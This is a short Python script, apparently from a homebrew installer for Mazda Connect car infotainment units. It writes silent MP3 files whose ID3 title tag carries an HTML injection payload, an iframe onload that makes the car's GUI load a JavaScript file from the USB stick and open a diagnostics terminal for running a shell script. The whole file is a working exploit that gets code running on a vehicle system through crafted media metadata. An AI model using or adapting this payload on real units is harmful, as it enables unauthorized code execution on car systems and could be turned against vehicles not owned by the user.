#!/usr/bin/env python3
"""
Create the USB "trigger" MP3s (installer/mp3/a-d.mp3).

Mazda Connect shows an MP3's title as HTML. The title below makes the GUI load
js/run.js from the USB stick, which opens the diagnostics terminal so run.sh can
be started. One file per possible USB mount point (sda1 ... sdd1).

Each MP3 is 3 seconds of silence. Requires: ffmpeg, mutagen
"""
import os
import subprocess
import tempfile

from mutagen.id3 import ID3, TIT2, TPE1, TALB

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
OUT = os.path.join(ROOT, "installer", "mp3")
os.makedirs(OUT, exist_ok=True)

with tempfile.TemporaryDirectory() as tmp:
    silent = os.path.join(tmp, "silent.mp3")
    subprocess.run(["ffmpeg", "-y", "-loglevel", "error", "-f", "lavfi", "-i", "anullsrc=r=44100:cl=mono",
                    "-t", "3", "-b:a", "32k", "-map_metadata", "-1", silent], check=True)
    data = open(silent, "rb").read()

    for letter in "abcd":
        dev = "sd%s1" % letter
        path = os.path.join(OUT, "%s.mp3" % letter)
        with open(path, "wb") as f:
            f.write(data)
        title = "</span><iframe onload=\"utility.loadScript('../../../mnt/%s/js/run.js')\"></iframe><span>" % dev
        tags = ID3()
        tags.add(TIT2(encoding=0, text=title))
        tags.add(TPE1(encoding=0, text="Home 2.0 installer"))
        tags.add(TALB(encoding=0, text=dev))
        tags.save(path, v2_version=3)
        print("wrote", path)
